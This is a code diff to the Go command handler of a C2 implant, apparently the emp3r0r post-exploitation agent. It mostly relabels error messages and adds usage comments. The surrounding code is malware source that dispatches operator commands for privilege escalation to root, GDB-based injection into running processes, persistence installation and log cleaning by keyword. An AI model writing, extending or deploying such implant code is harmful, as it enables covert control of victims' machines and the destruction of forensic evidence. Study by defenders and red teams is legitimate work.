@@ -21,7 +21,7 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 		// LPE helper
 		// !lpe script_name
 		if len(cmdSlice) < 2 {
-			out = fmt.Sprintf("args error: %s", cmdSlice)
+			out = fmt.Sprintf("Error: args error: %s", cmdSlice)
 			log.Printf(out)
 			return
 		}
@@ -31,9 +31,10 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 		return
 
 		// GDB inject
+		// !inject method pid
 	case emp3r0r_data.C2CmdInject:
 		if len(cmdSlice) != 3 {
-			out = fmt.Sprintf("args error: %v", cmdSlice)
+			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			return
 		}
 		out = fmt.Sprintf("%s: success", cmdSlice[1])
@@ -43,14 +44,15 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 		}
 		err = InjectorHandler(int(pid), cmdSlice[1])
 		if err != nil {
-			out = "failed: " + err.Error()
+			out = "Error: " + err.Error()
 		}
 		return
 
 		// persistence
+		// !persistence method
 	case emp3r0r_data.C2CmdPersistence:
 		if len(cmdSlice) != 2 {
-			out = fmt.Sprintf("args error: %v", cmdSlice)
+			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			return
 		}
 		out = "Success"
@@ -59,28 +61,29 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 			err = PersistAllInOne()
 			if err != nil {
 				log.Print(err)
-				out = fmt.Sprintf("Result: %v", err)
+				out = fmt.Sprintf("Error: Result: %v", err)
 			}
 		} else {
-			out = "No such method available"
+			out = "Error: No such method available"
 			if method, exists := PersistMethods[cmdSlice[1]]; exists {
 				out = "Success"
 				err = method()
 				if err != nil {
 					log.Println(err)
-					out = fmt.Sprintf("Result: %v", err)
+					out = fmt.Sprintf("Error: Result: %v", err)
 				}
 			}
 		}
 		return
 
 		// get_root
+		// !get_root
 	case emp3r0r_data.C2CmdGetRoot:
 		if os.Geteuid() == 0 {
-			out = "You already have root!"
+			out = "Warning: You already have root!"
 		} else {
 			err = GetRoot()
-			out = fmt.Sprintf("LPE exploit failed:\n%v", err)
+			out = fmt.Sprintf("Error: LPE exploit failed:\n%v", err)
 			if err == nil {
 				out = "Got root!"
 			}
@@ -88,9 +91,10 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 		return
 
 		// log cleaner
+		// !clean_log keyword
 	case emp3r0r_data.C2CmdCleanLog:
 		if len(cmdSlice) != 2 {
-			out = fmt.Sprintf("args error: %v", cmdSlice)
+			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
 			return
 		}
 		keyword := cmdSlice[1]
@@ -102,5 +106,5 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 		return
 	}
 
-	return fmt.Sprintf("Unknown command %v", cmdSlice)
+	return fmt.Sprintf("Error: Unknown command %v", cmdSlice)
 }
